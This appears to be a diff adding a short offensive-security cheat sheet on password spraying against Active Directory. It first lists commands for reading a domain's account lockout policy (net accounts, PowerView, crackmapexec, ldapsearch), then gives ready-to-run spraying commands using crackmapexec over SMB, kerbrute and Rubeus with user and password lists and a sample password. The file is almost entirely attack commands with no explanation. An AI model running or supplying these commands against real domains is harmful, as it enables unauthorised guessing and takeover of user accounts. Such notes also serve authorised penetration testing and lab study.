@@ -1,0 +1,31 @@
+#Password Spray
+
+#Check AD lockout threshold
+Windows
+net accounts
+
+(Get-DomainPolicy)."SystemAccess" #From powerview
+
+crackmapexec <IP> -u 'user' -p 'password' --pass-pol
+
+ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+
+
+
+
+
+
+#Spray attack
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+
+#Kerbrute
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+
+
+# with a list of users
+.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
+
+# check passwords for all users in current domain
+.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
+
+
